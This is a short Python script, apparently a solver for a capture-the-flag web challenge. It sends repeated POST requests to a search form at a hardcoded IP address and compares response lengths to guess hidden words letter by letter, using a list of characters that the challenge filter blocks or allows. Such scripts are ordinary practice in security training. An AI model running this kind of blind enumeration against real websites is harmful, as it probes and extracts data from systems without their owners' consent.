import requests
import string
session=requests.Session()
url="http://35.240.62.111/owls/"
letters=string.printable
filtered=['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', ' ', '\t', '\n', '\r', '\x0b', '\x0c']
allowed=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']



x=['z']
valuable=[]
owels_length=6803
length=6780
valuable=['a', 'e', 'g', 'h', 'l', 'o', 's', 't', 'u', 'w', 'y']
valuable.reverse()



	# payload=letter
	# data={"search":payload}
	# response=session.post(url,data=data)
	# content=response.text
	# error='Hack Detected'
	# success='Owels'

words=[]
for i in range(0,len(valuable)):
	index=i
	final=''
	setrange=len(valuable)
	while (index < setrange ):
		current=final+valuable[index]
		# Send the requests
		payload=current
		data={"search":payload}
		response=session.post(url,data=data)
		content=response.text
		print(f'[*] Trying {current} len :{len(content)}\tfinal:{final}')
		error='Hack Detected'
		success='Owels'
	# success.lower() not in content.lower()
		if (len(content) == length) or len(content) == 187: #Failed
			index+=1
		else: #Success
			final+=valuable[index] #Adding the letter to final
			index=0 #Reset the counter
	words.append(final)

print(words)